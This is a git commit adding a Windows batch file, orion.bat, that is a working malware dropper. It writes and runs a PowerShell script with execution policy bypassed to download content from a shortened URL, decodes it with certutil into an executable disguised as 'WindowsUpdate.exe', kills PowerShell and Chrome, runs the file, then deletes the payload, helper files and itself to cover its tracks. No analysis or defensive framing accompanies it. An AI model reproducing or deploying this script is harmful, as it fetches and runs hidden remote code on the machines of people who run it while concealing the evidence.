92e02a14d249a474b4e0ba6481d72ace193c20ac
abrar360 <abrar.m.ahmed@gmail.com>
2017-09-16 19:52:13 -0400

    Add files via upload

---
+++ orion.bat
@@ -0,0 +1,17 @@
+﻿@echo off
+taskkill /IM powershell.exe /F
+echo $url = 'https://goo.gl/bxEUkP' > powerboost.ps1
+echo $result = Invoke-WebRequest -Uri $url >> powerboost.ps1
+echo $result.content ^| Out-File 'certification.txt'>> powerboost.ps1
+echo exit >> powerboost.ps1
+start microsoft-edge:
+Powershell.exe -ExecutionPolicy ByPass -File powerboost.ps1
+certutil -decode certification.txt "WindowsUpdate.exe" >nul
+taskkill /IM chrome.exe /F
+WindowsUpdate.exe
+del /f powerboost.ps1
+del /f WindowsUpdate.exe
+del /f configuration_manifest.txt
+del /f certification.txt
+del /f emerald.txt
+del /f orion.bat & exit
